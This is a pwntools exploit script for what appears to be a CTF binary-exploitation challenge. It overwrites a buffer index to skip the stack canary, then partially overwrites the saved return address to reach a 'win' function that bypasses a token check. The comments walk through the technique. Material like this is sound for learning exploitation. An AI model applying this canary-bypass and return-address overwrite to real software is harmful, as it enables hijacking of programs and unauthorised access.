from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = sys.argv[1]
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, b"65536\n" + b"65536\n" + cyclic(500))
# win = elf.symbols['win']

# First trick, payload size and 'n' variable
# we need a way for the buffer so that we can skip bytes that we dont want to overwrite (like the canary or the first few bytes of return address)
# To do this,we need to leverage how 'n' works.
# n is just the index of the buffer, which means if we can overwrite n to a larger number we can skip some bytes
# Since we ONLY need to overwrite the last 2 bytes (3 nibbles technically), we need to change n to the second to last index from the saved return
# Also, the payload size has no restrictions, so adjust to the saved return position 

# EDITOR's NOTE
# I'm a bit dumb. So let me tell you something so you dotn repeat my mistake
# Data are stored in little endian, which means the last 2 bytes become the "first" two byte.

# SHORT NOTE:
# How do we now at what offset n is? use gdb, examine the cmp statement, observe how the values change (annoying asf)
# How to get the return address's position? after getting n, brute force until you get the canary, then you can guess
# Keep in mind you have to make sure second_offset doesnt go past saved return because then the stack isnt smashed (even if
# everything after the stack is)
# The most annoying challenge man

# Address overwriting
# By debugging the program, we can get the last 2 bytes of the saved return address (0x2a65). and win address where a token check will be skipped (0x1f52)
#

# Overall this challenge is a bit more involved and less automated than the others. Also, i like the insight of 0x1000 alignment
# but the challenges are hot trash. The need to brute force the 4th last nibble is very annoying.

def full_send():
    io = start()

    # io.sendlineafter(b"size: ",payload_size)
    io.send(payload)
    io.interactive()
    data = io.recvall()
    if b"ERROR" in data:
        print(data)
        exit()

win_authed = p16(0x1844)
saved_ret = 0x2a65 

payload_size = b"58"
first_offset = 36
second_offset = 55

payload = flat([payload_size+b"\n", b"A"*first_offset])
payload += p8(second_offset)
# payload += p32(0x0)
payload += win_authed
open("payload", "wb").write(payload)
# for i in range(50):
    # payload += b"a"*i
full_send() 
    